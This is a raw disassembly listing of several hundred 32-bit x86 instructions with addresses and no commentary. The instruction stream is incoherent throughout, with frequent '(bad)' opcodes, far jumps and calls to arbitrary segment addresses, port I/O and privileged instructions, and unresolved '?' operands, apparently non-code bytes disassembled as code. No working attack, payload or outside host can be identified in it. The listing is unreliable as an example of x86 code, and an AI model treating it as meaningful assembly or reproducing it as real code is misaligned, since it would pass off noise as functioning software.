  411899:	jmp    0x941a:0xa4c73864
  4118a0:	int3   
  4118a1:	mov    ebx,0x20dc82ff
  4118a6:	pop    esi
  4118a7:	push   cs
  4118a8:	jo     0x4118f7
  4118aa:	lahf   
  4118ab:	lahf   
  4118ac:	and    al,0xbc
  4118ae:	sub    eax,0x1ff3af7b
  4118b3:	xchg   ebp,eax
  4118b4:	jbe    0x411912
  4118b6:	icebp  
  4118b7:	dec    ebx
  4118b8:	push   ds
  4118b9:	push   ss
  4118ba:	cmp    eax,0x3c2d1762
  4118bf:	add    dl,BYTE PTR [ebx-0x14]
  4118c2:	mov    al,0x9
  4118c4:	nop
  4118c5:	push   ecx
  4118c6:	scas   al,BYTE PTR es:[edi]
  4118c7:	dec    esp
  4118c8:	xor    bh,ch
  4118ca:	or     BYTE PTR [eax],al
  4118cc:	mov    BYTE PTR [esi+ebx*2-0x1f39f742],bl
  4118d3:	test   dl,bl
  4118d5:	push   esp
  4118d6:	out    dx,al
  4118d7:	jmp    0x411953
  4118d9:	pop    ecx
  4118da:	mov    dl,0x38
  4118dc:	out    dx,al
  4118dd:	aam    0x92
  4118df:	mov    WORD PTR [ecx],es
  4118e1:	or     DWORD PTR [esi+0x68],ecx
  4118e4:	mov    ebp,0xdee70578
  4118e9:	stos   DWORD PTR es:[edi],eax
  4118ea:	jmp    0x411879
  4118ec:	mov    ?,WORD PTR [ebx-0x53dee24]
  4118f2:	loopne 0x4118de
  4118f4:	hlt    
  4118f5:	push   es
  4118f6:	loopne 0x41194f
  4118f8:	mov    DWORD PTR [ecx-0x2a318d0b],0x1b1c0b0f
  411902:	mov    ecx,0xe7ed6713
  411907:	cmp    BYTE PTR [ebp+0x70],0xc4
  41190b:	addr16 pusha 
  41190d:	inc    esi
  41190e:	fsubr  DWORD PTR [ecx-0x21929ef]
  411914:	dec    esp
  411915:	sub    al,0x2f
  411917:	and    eax,0xb53a38ca
  41191c:	mov    ecx,0x8c21c03b
  411921:	into   
  411922:	push   esp
  411923:	mov    bh,0x8b
  411925:	call   0x8e31:0x10b4e2f7
  41192c:	and    eax,0xe7a428c6
  411931:	lock or dh,BYTE PTR fs:[edx]
  411935:	and    ecx,eax
  411937:	cmovle ebp,DWORD PTR [edx+edx*8-0x661959ed]
  41193f:	(bad)  
  411940:	in     al,dx
  411941:	or     ebp,edx
  411943:	jp     0x4119b9
  411945:	js     0x41190b
  411947:	lahf   
  411948:	add    ah,BYTE PTR [ebp*4-0x5a5ab216]
  41194f:	das    
  411950:	in     eax,dx
  411951:	add    DWORD PTR [edi],edi
  411953:	mov    ebp,0xda2c058b
  411958:	mov    bh,0x2a
  41195a:	int3   
  41195b:	push   0xd29f716
  411960:	pop    esi
  411961:	xchg   edx,eax
  411962:	in     al,0x56
  411964:	lods   al,BYTE PTR es:[esi]
  411966:	mov    al,ds:0xf105c94c
  41196b:	dec    ebx
  41196c:	adc    eax,0x792463b0
  411971:	les    esi,FWORD PTR cs:[esi-0x14]
  411975:	out    dx,al
  411976:	fs mov ah,0xaf
  411979:	mov    al,ds:0xaab0d3d6
  41197e:	mov    esi,0x71580bf2
  411983:	dec    esp
  411984:	and    dl,0x23
  411987:	xchg   BYTE PTR [ecx+0xdfbabf9],cl
  41198d:	les    esp,FWORD PTR [edi-0x6b81f369]
  411993:	inc    ebp
  411994:	les    ebp,FWORD PTR [esi+0x9663121]
  41199a:	inc    ebx
  41199b:	jl     0x41192d
  41199d:	(bad)  
  41199f:	ss dec ecx
  4119a1:	mov    ecx,0x1583f999
  4119a6:	dec    ecx
  4119a7:	outs   dx,BYTE PTR ds:[esi]
  4119a8:	jecxz  0x4119c6
  4119aa:	(bad)  
  4119ab:	cs inc eax
  4119ad:	push   esi
  4119ae:	clc    
  4119af:	xor    al,0x8b
  4119b1:	jnp    0x4119d9
  4119b3:	push   ebx
  4119b4:	xchg   ecx,eax
  4119b5:	and    dl,BYTE PTR gs:[ebp-0x5ea0c257]
  4119bc:	in     al,0x90
  4119be:	(bad)  
  4119bf:	repnz xor bh,BYTE PTR [ebx+ecx*2+0x6a]
  4119c4:	(bad)  
  4119c5:	stos   BYTE PTR es:[edi],al
  4119c6:	sub    ch,BYTE PTR [ebp-0x5a089326]
  4119cc:	jg     0x4119d7
  4119ce:	pop    ebp
  4119cf:	aaa    
  4119d0:	cmp    BYTE PTR ds:0x7795c735,dl
  4119d6:	nop
  4119d7:	or     DWORD PTR [ecx],esi
  4119d9:	in     eax,dx
  4119da:	mov    dl,0x15
  4119dc:	jo     0x4119a5
  4119de:	rcr    BYTE PTR [edx],0x4c
  4119e1:	pop    ebx
  4119e2:	scas   eax,DWORD PTR es:[edi]
  4119e3:	les    esp,FWORD PTR [ebx-0x3a0351d2]
  4119e9:	test   DWORD PTR [edx+eax*8-0x30],edx
  4119ed:	jle    0x4119c7
  4119ef:	hlt    
  4119f0:	jae    0x411a02
  4119f2:	dec    ecx
  4119f3:	inc    edi
  4119f4:	and    cl,dh
  4119f6:	mov    eax,0x373c49dc
  4119fb:	stos   BYTE PTR es:[edi],al
  4119fc:	push   edx
  4119fd:	bnd ja 0x411a01
  411a00:	mov    bl,0x79
  411a02:	(bad)  
  411a03:	aam    0x4c
  411a05:	xchg   ecx,eax
  411a06:	cmp    al,0xf0
  411a08:	or     al,0x82
  411a0a:	or     BYTE PTR [eax+0x17],bh
  411a0d:	fdiv   QWORD PTR [ebp+0x6f]
  411a10:	retf   
  411a11:	cdq    
  411a12:	aad    0xd4
  411a14:	and    al,0x50
  411a16:	or     esi,DWORD PTR [edx+0x3a2f0868]
  411a1c:	jp     0x411a28
  411a1e:	jnp    0x4119f6
  411a20:	xor    ah,BYTE PTR [ecx+ecx*1]
  411a23:	int    0x12
  411a25:	fcomi  st,st(0)
  411a27:	ror    DWORD PTR [edx+0x3599e629],1
  411a2d:	jne    0x411a52
  411a2f:	sbb    al,0xca
  411a31:	pop    ebp
  411a32:	or     al,al
  411a34:	(bad)  
  411a36:	inc    edx
  411a37:	push   ebp
  411a38:	push   ebp
  411a39:	pusha  
  411a3a:	mov    al,ds:0x6067b000
  411a3f:	push   ebp
  411a40:	fcomp  QWORD PTR [edi+ebx*2-0x2a28dc06]
  411a47:	lods   al,BYTE PTR ds:[esi]
  411a48:	cmp    dh,dl
  411a4a:	dec    esi
  411a4b:	mov    bh,0x88
  411a4d:	cdq    
  411a4e:	aaa    
  411a4f:	xchg   ecx,eax
  411a50:	daa    
  411a51:	cli    
  411a52:	icebp  
  411a53:	mov    ebp,0x7caa8930
  411a58:	dec    ecx
  411a59:	pushf  
  411a5a:	add    DWORD PTR [ebx],0x549e7b58
  411a60:	retf   0xe872
  411a63:	dec    ebx
  411a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a65:	mov    cl,0x70
  411a67:	gs pop edi
  411a69:	xchg   edx,eax
  411a6a:	jmp    0x4119fc
  411a6c:	mov    dl,0xce
  411a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a6f:	aas    
  411a70:	ja     0x411a80
  411a72:	retf   
  411a73:	sbb    al,0x65
  411a75:	fld    QWORD PTR [ebx+0xb]
  411a78:	sti    
  411a79:	jl     0x411a0b
  411a7b:	cmp    dl,dl
  411a7d:	(bad)  
  411a7e:	pop    eax
  411a7f:	mov    esp,0xf3661350
  411a84:	cmovb  ebp,DWORD PTR [ebp+eax*2-0x2e]
  411a89:	test   BYTE PTR [esp+eiz*2-0x30],dl
  411a8d:	imul   ecx,edx,0xb3f60960
  411a93:	rcl    bl,0x6c
  411a96:	fmul   st,st(4)
  411a98:	mov    esp,0x9edb277
  411a9d:	out    dx,eax
  411a9e:	jmp    0x411a3d
  411aa0:	push   cs
  411aa1:	call   0x54f7:0x1ffea518
  411aa8:	hlt    
  411aa9:	jno    0x411a46
  411aab:	jl     0x411ab2
  411aad:	arpl   WORD PTR [eax],dx
  411aaf:	add    edx,esi
  411ab1:	cwde   
  411ab2:	cmp    dl,BYTE PTR [esi+esi*4]
  411ab5:	loopne 0x411a82
  411ab7:	mov    ebx,0xf56f9586
  411abc:	and    edi,DWORD PTR [edx+0x1a67334b]
  411ac2:	in     al,dx
  411ac3:	stos   DWORD PTR es:[edi],eax
  411ac4:	jb     0x411a56
  411ac6:	dec    edx
  411ac7:	fldcw  WORD PTR [ecx]
  411ac9:	in     al,dx
  411aca:	outs   dx,BYTE PTR ds:[esi]
  411acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411acc:	cmp    bl,dl
  411ace:	pop    ecx
  411acf:	(bad)  
  411ad0:	or     bh,BYTE PTR [edx+0xa5fba39]
  411ad6:	pcmpgtw mm1,QWORD PTR [esi]
  411ad9:	mov    edi,0xe458be15
  411ade:	dec    ebp
  411adf:	jmp    0xdf20:0x67a5afc1
  411ae6:	pusha  
  411ae7:	mov    eax,edx
  411ae9:	adc    al,0xbe
  411aeb:	loope  0x411aa1
  411aed:	jmp    0xd71c00ef
  411af2:	fisubr DWORD PTR [edi+edi*4]
  411af5:	loope  0x411a8d
  411af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411af9:	jg     0x411ac1
  411afb:	jns    0x411a89
  411afd:	xor    edi,DWORD PTR [edx]
  411aff:	push   ds
  411b00:	add    esp,edx
  411b02:	aas    
  411b03:	mov    ebx,DWORD PTR [eax+0x3f1399a6]
  411b09:	dec    ecx
  411b0a:	adc    al,0xc6
  411b0c:	rol    DWORD PTR [esi-0x7ff7869e],0x57
  411b13:	mov    ah,0xfb
  411b15:	add    al,bl
  411b17:	xchg   eax,eax
  411b19:	ins    DWORD PTR es:[edi],dx
  411b1a:	ds test al,0x1
  411b1d:	pop    ss
  411b1e:	ins    DWORD PTR es:[edi],dx
  411b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b20:	shl    BYTE PTR [eax-0x44a03e9a],1
  411b26:	call   ecx
  411b28:	inc    esi
  411b29:	mov    al,ds:0xfb421d23
  411b2e:	push   cs
  411b2f:	bts    DWORD PTR [edx+0x58],edx
  411b33:	mov    al,ds:0xda5b0239
  411b38:	mov    edi,0x283efd8c
  411b3d:	das    
  411b3e:	out    dx,al
  411b3f:	clc    
  411b40:	out    dx,eax
  411b41:	add    eax,ecx
  411b43:	jb     0x411b24
  411b45:	lods   al,BYTE PTR ds:[esi]
  411b46:	shr    BYTE PTR [esi],0x39
  411b49:	cmp    eax,0x89b3cdf3
  411b4e:	mov    bl,0xac
  411b50:	popf   
  411b51:	(bad)  
  411b52:	loop   0x411b23
  411b54:	das    
  411b55:	xor    eax,0x6bedd456
  411b5a:	xchg   BYTE PTR [eax-0x58],cl
  411b5d:	jnp    0x411b02
  411b5f:	dec    esp
  411b60:	(bad)  
  411b61:	fdivp  st(0),st
  411b63:	test   ebx,esp
  411b65:	ins    DWORD PTR es:[edi],dx
  411b66:	adc    BYTE PTR [ebx],dh
  411b68:	mov    ecx,DWORD PTR [ecx-0x4b607484]
  411b6e:	lahf   
  411b6f:	and    eax,0xd635f0a
  411b74:	aam    0x49
  411b76:	sub    eax,0x85c34cd6
  411b7b:	or     eax,0xbbf6e617
  411b80:	lahf   
  411b81:	out    0x4c,al
  411b83:	jmp    0x6ab6:0x1c56f9d6
  411b8a:	(bad)  
  411b8b:	bound  eax,QWORD PTR [ebx]
  411b8d:	pushf  
  411b8e:	ins    DWORD PTR es:[edi],dx
  411b8f:	loop   0x411b74
  411b91:	shl    DWORD PTR [edi+0x6f],cl
  411b94:	jecxz  0x411be3
  411b96:	lea    ecx,[esi]
  411b98:	out    dx,eax
  411b99:	fs pop edx
  411b9b:	sti    
  411b9c:	xchg   edx,eax
  411b9d:	in     al,dx
  411b9e:	jmp    0xfa33:0x34e062b7
  411ba5:	xor    DWORD PTR [edi],ecx
  411ba7:	js     0x411beb
  411ba9:	and    al,0xa2
  411bab:	sub    al,0x31
  411bad:	idiv   BYTE PTR [eax+0xf]
  411bb0:	or     DWORD PTR [eax-0x2b],esi
  411bb3:	xor    DWORD PTR [ebp+0x71846c6e],ebx
  411bb9:	dec    edx
  411bba:	sahf   
  411bbb:	jb     0x411c23
  411bbd:	cwde   
  411bbe:	mov    ch,0x3
  411bc0:	cmp    al,BYTE PTR [edi+0xd]
  411bc3:	imul   esi,DWORD PTR [esi+ebp*4-0x2],0xf95c1873
  411bcb:	mov    ds:0x7fe265e8,eax
  411bd0:	fdivr  QWORD PTR [edx+0xb]
  411bd3:	hlt    
  411bd4:	imul   edi,ebp,0x465089c
  411bda:	add    al,0x7c
  411bdc:	mov    fs,edi
  411bde:	adc    ecx,edi
  411be0:	clc    
  411be1:	dec    eax
  411be2:	pushf  
  411be3:	cmp    eax,0xdb3b726f
  411be8:	jnp    0x411c20
  411bea:	cmc    
  411beb:	retf   0x6f6e
  411bee:	add    al,0x24
  411bf0:	imul   edx,DWORD PTR [ebx],0x3841b0c7
  411bf6:	cmp    al,0x9d
  411bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf9:	lea    ebp,[ebp+0x2032b77c]
  411bff:	jmp    DWORD PTR [eax-0x145a5e21]
  411c05:	mov    WORD PTR [ebx-0x50],?
  411c08:	and    esi,DWORD PTR [ecx+0x514f7d92]
  411c0e:	sub    al,0x9e
  411c10:	jnp    0x411c6b
  411c12:	stos   DWORD PTR es:[edi],eax
  411c13:	push   edx
  411c14:	xchg   esp,eax
  411c15:	aaa    
  411c16:	cli    
  411c17:	jbe    0x411c8b
  411c19:	add    al,BYTE PTR [edi-0x285e5710]
  411c1f:	cmc    
  411c20:	pop    eax
  411c21:	cmp    al,0x86
  411c23:	jge    0x411c46
  411c25:	or     al,0x35
  411c27:	mov    ah,0xb9
  411c29:	push   ds
  411c2a:	dec    DWORD PTR gs:[eax-0xbfaa462]
  411c31:	jmp    0xb04f4bb8
  411c36:	arpl   sp,si
  411c38:	js     0x411c13
  411c3a:	mov    edi,0xfeed5173
  411c3f:	cmp    BYTE PTR ds:0xd78d4ecf,bh
  411c45:	push   es
  411c46:	arpl   WORD PTR [ecx-0x51],si
  411c49:	mov    al,0x3c
  411c4b:	lock xchg DWORD PTR cs:[ebp-0x6cea926],edi
  411c53:	lahf   
  411c54:	pop    edi
  411c55:	push   ecx
  411c56:	jp     0x411cd0
  411c58:	dec    edx
  411c59:	dec    edi
  411c5a:	add    ebp,DWORD PTR [ecx-0x34]
  411c5d:	outs   dx,DWORD PTR ds:[esi]
  411c5e:	out    dx,al
  411c5f:	test   BYTE PTR [esi-0x5f],ch
  411c62:	std    
  411c63:	lea    ecx,[ebx-0x325b7390]
  411c69:	jae    0x411c34
  411c6b:	xor    BYTE PTR [esi+0x65da7821],cl
  411c71:	adc    esi,edi
  411c73:	sbb    eax,0xc200df55
  411c78:	call   0x8589:0xaef4b379
  411c7f:	(bad)  
  411c80:	out    dx,al
  411c81:	(bad)  
  411c82:	mov    ah,0x98
  411c84:	push   edi
  411c85:	sbb    al,0xd1
  411c87:	loop   0x411d02
  411c89:	jnp    0x411c4f
  411c8b:	scas   al,BYTE PTR es:[edi]
  411c8c:	inc    esi
  411c8d:	(bad)  
  411c8e:	scas   eax,DWORD PTR es:[edi]
  411c8f:	in     al,0x72
  411c91:	fistp  QWORD PTR [ebp+0x1b]
  411c95:	stos   BYTE PTR es:[edi],al
  411c96:	cwde   
  411c97:	imul   esi,DWORD PTR [edi+0x45],0x9368efe2
  411c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9f:	sbb    eax,0x2c6f6db6
  411ca4:	or     ecx,ebx
  411ca6:	dec    edx
  411ca7:	clc    
  411ca8:	loopne 0x411c31
  411caa:	test   DWORD PTR [edi+0x53],ebx
  411cad:	les    edi,FWORD PTR [edx-0x7a6144e1]
  411cb3:	lahf   
  411cb4:	jmp    0x411cdd
  411cb6:	mov    BYTE PTR [edx-0x2f246281],al
  411cbc:	jg     0x411c54
  411cbe:	stos   DWORD PTR es:[edi],eax
  411cbf:	std    
  411cc0:	inc    esi
  411cc1:	fwait
  411cc2:	add    bl,BYTE PTR [esi+0x1b15f548]
  411cc8:	or     eax,0x707daac0
  411ccd:	sub    esi,DWORD PTR [edi+0x2c]
  411cd0:	mov    esi,0xdd2511a5
  411cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd6:	ds sub eax,0xd8e97e13
  411cdc:	mov    dl,0xed
  411cde:	push   edx
  411cdf:	sbb    eax,0x6c51f93e
  411ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ce5:	imul   ecx,eax,0x908031ce
  411ceb:	cli    
  411cec:	std    
  411ced:	add    esi,edx
  411cef:	data16 jo 0x411c80
  411cf2:	shr    BYTE PTR [esi+0x4c],0x75
  411cf6:	xchg   edx,eax
  411cf7:	jmp    0x411caf
  411cf9:	pop    ds
  411cfa:	cmp    DWORD PTR [ecx-0x64],ebp
  411cfd:	jle    0x411cdd
  411cff:	aad    0xf8
  411d01:	loopne 0x411d2d
  411d03:	std    
  411d04:	mov    ch,BYTE PTR [edi]
  411d06:	outs   dx,DWORD PTR ds:[esi]
  411d07:	iret   
  411d08:	fsubr  QWORD PTR [ecx-0x74]
  411d0b:	adc    al,0x17
  411d0d:	leave  
  411d0e:	pop    edx
  411d0f:	or     ah,dh
  411d11:	mov    esi,0x1b0391e0
  411d16:	ss dec ebp
  411d18:	pop    eax
  411d19:	stc    
  411d1a:	push   eax
  411d1b:	lods   eax,DWORD PTR ds:[esi]
  411d1c:	repz push edx
  411d1e:	xchg   ebp,eax
  411d1f:	lock call 0x921ea0f0
  411d25:	jae    0x411d34
  411d27:	arpl   WORD PTR [ecx+0x63],bp
  411d2a:	mov    DWORD PTR [ebp-0x6c],esi
  411d2d:	out    0xff,al
  411d2f:	inc    edx
  411d30:	mov    dh,ch
  411d32:	push   ss
  411d33:	cs iret 
  411d35:	mov    ch,0x8a
  411d37:	adc    ecx,DWORD PTR [ecx+ebx*2+0x8472e09]
  411d3e:	test   eax,0x89f4d25a
  411d43:	je     0x411d85
  411d45:	fs popf 
  411d47:	inc    eax
  411d48:	fldenv ds:0xe775dc6c
  411d4e:	in     eax,0x16
  411d50:	or     DWORD PTR [ebx+0xd38b382],ecx
  411d56:	adc    eax,0x32fbbecc
  411d5b:	sub    edx,edi
  411d5d:	jb     0x411d84
  411d5f:	mov    edx,0xad7a8232
  411d64:	loopne 0x411d23
  411d66:	(bad)  
  411d67:	pop    ebx
  411d68:	and    ebp,DWORD PTR [edx-0x3f]
  411d6b:	in     al,0x4b
  411d6d:	dec    eax
  411d6e:	cmp    eax,0x8dc92864
  411d73:	add    al,0xea
  411d75:	stos   BYTE PTR es:[edi],al
  411d76:	fnstsw WORD PTR [edx-0x7c]
  411d79:	adc    DWORD PTR [ebp-0x55],eax
  411d7c:	adc    edi,DWORD PTR [ecx+0x48]
  411d7f:	nop
  411d80:	(bad)
  411d84:	cmp    eax,0xfe203fab
  411d89:	fcmovb st,st(3)
  411d8b:	enter  0xca29,0xe4
  411d8f:	retf   
  411d90:	cdq    
  411d91:	mov    ch,0x31
  411d93:	push   esp
  411d94:	fstp   DWORD PTR [ebx+0x699df10d]
  411d9a:	call   FWORD PTR [edx+eiz*2+0xb]
  411d9e:	mov    DWORD PTR ds:0xd646c9de,ebx
  411da4:	jg     0x411dfc
  411da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411da7:	les    esp,FWORD PTR [edx+0x601a95f]
  411dad:	pop    ecx
  411dae:	jnp    0x411d55
  411db0:	ss mov eax,0x81d160de
  411db6:	add    al,0xef
  411db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db9:	xor    esp,ebx
  411dbb:	call   0x3ec2:0xd7524df7
  411dc2:	xor    ecx,DWORD PTR [esi+0x1422579]
  411dc8:	cmp    eax,0x6b6cee61
  411dcd:	call   0x3db7:0x4d9062e2
  411dd4:	aaa    
  411dd5:	into   
  411dd6:	push   0x89e52b27
  411ddb:	ret    0xf3f6
  411dde:	fmul   DWORD PTR [ebp+0x57]
  411de1:	or     dh,cl
  411de3:	push   ss
  411de4:	jmp    0x4743:0x7e4a53c7
  411deb:	mov    al,ds:0x6a76589a
  411df0:	mov    eax,0xbce22add
  411df5:	bnd js 0x411db4
  411df8:	imul   ebx,DWORD PTR [eax+0xd77ca2a],0x2a2f2c4b
  411e02:	imul   ecx,DWORD PTR [esi+ebx*2-0x1e148169],0x73
  411e0a:	popa   
  411e0b:	sub    BYTE PTR [eax+0x67555434],dh
  411e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e12:	dec    esi
  411e13:	call   0x5fb0:0x3b8a7a12
  411e1a:	fld    QWORD PTR [eax]
  411e1c:	dec    edi
  411e1d:	adc    al,0xe6
  411e1f:	ds jmp 0x46caef3e
  411e25:	lahf   
  411e26:	xchg   edx,eax
  411e27:	fld    QWORD PTR [ebx+edx*2]
  411e2a:	imul   eax,DWORD PTR [esi+ecx*8-0x6b2a89a3],0xffffffd9
  411e32:	xchg   edx,eax
  411e33:	mov    ch,0xa2
  411e35:	popf   
  411e36:	call   0x5ee822f
  411e3b:	cmp    dh,BYTE PTR [esi]
  411e3d:	push   0x5350eb70
  411e42:	stc    
  411e43:	inc    esi
  411e44:	daa    
  411e45:	pop    eax
  411e46:	in     eax,0x8a
  411e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e49:	repz jge 0x411dec
  411e4c:	std    
  411e4d:	lods   eax,DWORD PTR ds:[esi]
  411e4e:	shl    BYTE PTR [edx+0x6657fa0e],cl
  411e54:	outs   dx,DWORD PTR ds:[esi]
  411e55:	test   ch,0x49
  411e58:	pop    ss
  411e59:	div    DWORD PTR [edx+0x13d9bb75]
  411e5f:	addr16 cmc 
  411e61:	jno    0x411de3
  411e63:	mov    eax,ds:0xdd252ffd
  411e68:	mov    ecx,0x897d58b3
  411e6d:	sbb    ch,BYTE PTR [edi+eax*4+0x2a]
  411e71:	imul   eax,DWORD PTR [ebx],0x33021597
  411e77:	adc    ecx,DWORD PTR [ebx-0x6b]
  411e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7b:	and    cl,BYTE PTR es:[esi+0x2151e222]
  411e82:	not    DWORD PTR [esi+0x3f28b08b]
  411e88:	inc    ecx
  411e89:	sub    edx,esp
  411e8b:	jmp    0xa705:0xb0811a42
  411e92:	fsub   QWORD PTR [edi+edx*8]
  411e95:	sub    al,0x7f
  411e97:	aas    
  411e98:	adc    bh,dh
  411e9a:	ret    
  411e9b:	shl    BYTE PTR [eax],0x2b
  411e9e:	push   ebp
  411e9f:	repnz in al,dx
  411ea1:	test   al,0x75
  411ea3:	loop   0x411e4e
  411ea5:	not    eax
  411ea7:	push   ds
  411ea8:	sub    DWORD PTR [edi+0x39],0x18d09437
  411eaf:	mov    edx,0x50c3fa
  411eb4:	out    dx,al
  411eb5:	js     0x411e69
  411eb7:	cmp    BYTE PTR [edi],0x66
  411eba:	lea    ecx,[edi+ebp*1-0x2a]
  411ebe:	or     al,0x2d
  411ec0:	xor    al,0x3c
  411ec2:	mov    eax,0x1574a4e4
  411ec7:	fcmovb st,st(2)
  411ec9:	xlat   BYTE PTR ds:[ebx]
  411eca:	imul   DWORD PTR [ecx]
  411ecc:	dec    eax
  411ecd:	imul   ebp
  411ecf:	pop    eax
  411ed0:	cdq    
  411ed1:	popa   
  411ed2:	jo     0x411eae
  411ed4:	cmp    cl,dl
  411ed6:	mov    ebx,esp
  411ed8:	leave  
  411ed9:	jbe    0x411e71
  411edb:	pop    ds
  411edc:	imul   esi,DWORD PTR [esi-0x5f9a85c5],0xfffffff3
  411ee3:	inc    esi
  411ee4:	and    eax,0x28193e8f
  411ee9:	xor    ch,BYTE PTR [ebx]
  411eeb:	into   
  411eec:	(bad)  
  411eed:	push   edx
  411eee:	in     eax,dx
  411eef:	out    0x7e,eax
  411ef1:	add    DWORD PTR [ebx+0x39],edx
  411ef4:	push   esp
  411ef5:	fldl2t 
  411ef7:	mov    bh,0x3
  411ef9:	jnp    0x411f2c
  411efb:	retf   0xc62e
  411efe:	cdq    
  411eff:	adc    edi,DWORD PTR [edi-0x4f]
  411f02:	and    al,dh
  411f04:	mov    al,0x7f
  411f06:	and    esi,DWORD PTR [ebp-0x6097182d]
  411f0c:	cmp    BYTE PTR [edi+0x3d],al
  411f0f:	mov    ah,0x22
  411f11:	mov    bl,0x5d
  411f13:	popa   
  411f14:	mov    ds:0x61abf60b,eax
  411f19:	dec    edi
  411f1a:	leave  
  411f1b:	or     edx,DWORD PTR ds:0xa84d0302
  411f21:	into   
  411f22:	ret    0x6650
  411f25:	fwait
  411f26:	inc    ebp
  411f27:	pop    edi
  411f28:	cwde   
  411f29:	pop    ebp
  411f2a:	sub    BYTE PTR [ebx],bl
  411f2c:	(bad)  
  411f2d:	pusha  
  411f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f2f:	sbb    DWORD PTR [esi-0x25],0x30
  411f33:	sub    al,0x92
  411f35:	popf   
  411f36:	les    eax,FWORD PTR [edi-0x73]
  411f39:	loopne 0x411f43
  411f3b:	cmp    BYTE PTR [edi+0x7e],dh
  411f3e:	mov    al,ds:0xc83b79
  411f43:	cs jle 0x411f34
  411f46:	jmp    0x411f0f
  411f48:	retf   
  411f49:	lods   al,BYTE PTR ds:[si]
  411f4b:	loop   0x411ef7
  411f4d:	fild   WORD PTR [ecx-0xbcb4a9d]
  411f53:	dec    edi
  411f54:	imul   esi,DWORD PTR [eax+0x6f],0xffffffde
  411f58:	sbb    BYTE PTR [edx],al
  411f5a:	out    0x4a,eax
  411f5c:	scas   al,BYTE PTR es:[edi]
  411f5d:	test   eax,0x9f482748
  411f63:	sub    DWORD PTR [ebp-0x6c3e11c7],esi
  411f69:	cli    
  411f6a:	dec    esp
  411f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f6c:	inc    edx
  411f6d:	sub    BYTE PTR [esi+0x2befccfc],dh
  411f73:	push   esi
  411f74:	inc    DWORD PTR ds:0xfe62fb8
  411f7a:	sbb    BYTE PTR [edi+ebx*2],ah
  411f7d:	ret    0x106c
  411f80:	nop
  411f81:	sbb    DWORD PTR [eax+0x38896206],eax
  411f87:	nop
  411f88:	mov    esp,0xe7e61bb4
  411f8d:	aam    0x28
  411f8f:	test   BYTE PTR [edi],al
  411f91:	xor    dh,dl
  411f93:	scas   al,BYTE PTR es:[edi]
  411f94:	imul   ecx,ebp,0xc289d85d
  411f9a:	mov    eax,ds:0x14a76933
  411f9f:	dec    esp
  411fa0:	inc    esp
  411fa1:	mov    cl,0x9f
  411fa3:	(bad)  
  411fa4:	in     eax,0x76
  411fa6:	inc    ebp
  411fa7:	retf   0x6a3e
  411faa:	dec    esi
  411fab:	adc    eax,0xcc2fca63
  411fb0:	test   al,0xb6
  411fb2:	mov    DWORD PTR [ebp+ebx*1-0x25],edi
  411fb6:	mov    ecx,0xf537b74b
  411fbb:	stos   DWORD PTR es:[edi],eax
  411fbc:	mov    esp,0xa550bfb9
  411fc1:	sti    
  411fc2:	inc    edi
  411fc3:	es inc bx
  411fc6:	dec    esp
  411fc7:	adc    cl,BYTE PTR [eax+0x76efc158]
  411fcd:	ret    0xd454
  411fd0:	pop    esi
  411fd1:	mov    eax,ds:0xcc2cde69
  411fd6:	(bad)  
  411fd7:	mov    ecx,0xafb6a00
  411fdc:	pop    ecx
  411fdd:	ret    0x161b
  411fe0:	push   edx
  411fe1:	sub    eax,0x4fe7c6f9
  411fe6:	jo     0x41201e
  411fe8:	outs   dx,BYTE PTR ds:[esi]
  411fe9:	mov    ds:0x56f5b18f,al
  411fee:	or     eax,0x7c17816c
  411ff3:	(bad)  
  411ff5:	or     al,0x2d
  411ff7:	push   cs
  411ff8:	mov    cl,0x8f
  411ffa:	into   
  411ffb:	loopne 0x411fae
  411ffd:	or     BYTE PTR [edi+0x2d4c204f],0x43
  412004:	dec    BYTE PTR [ecx-0x52]
  412007:	idiv   BYTE PTR [ebp+0x68]
  41200a:	push   0x52
  41200c:	or     ah,BYTE PTR [edi+ebx*2+0x63]
  412010:	jae    0x41206a
  412012:	add    bl,dh
  412014:	fincstp 
  412016:	hlt    
  412017:	or     DWORD PTR [ebp-0x4a],esp
  41201a:	fistp  DWORD PTR [ebx+ecx*8+0x6c]
  41201e:	or     DWORD PTR [eax-0x480fdf5f],esp
  412024:	inc    esi
  412025:	cmp    ebp,DWORD PTR [ecx]
  412027:	lea    esp,ds:0x4330a412
  41202d:	push   esp
  41202e:	pop    ds
  41202f:	icebp  
  412030:	adc    esi,ebx
  412032:	ins    BYTE PTR es:[edi],dx
  412033:	cmp    eax,0x2fb27617
  412038:	loop   0x412055
  41203a:	in     al,dx
  41203b:	lods   al,BYTE PTR ds:[esi]
  41203c:	retf   0x6656
  41203f:	imul   esi,DWORD PTR [ebx-0x27],0x0
  412043:	push   0xc54dc8d7
  412048:	jmp    0xf9d3:0x14123239
  41204f:	pop    ebp
  412050:	scas   eax,DWORD PTR es:[edi]
  412051:	rcr    BYTE PTR [ebp+eax*1+0x57322910],1
  412058:	push   edx
  412059:	adc    BYTE PTR [edi-0x5],dh
  41205c:	push   esp
  41205d:	bound  esi,QWORD PTR [edi-0x5104e3d4]
  412063:	fwait
  412064:	push   ebx
  412065:	dec    cx
  412067:	push   0xc30acd22
  41206c:	push   edx
  41206d:	fbld   TBYTE PTR [eax]
  41206f:	test   eax,0x4e1d2124
  412074:	inc    ebp
  412075:	imul   edi,DWORD PTR [ebp-0x31b9fc13],0x3b20b47c
  41207f:	adc    ah,bh
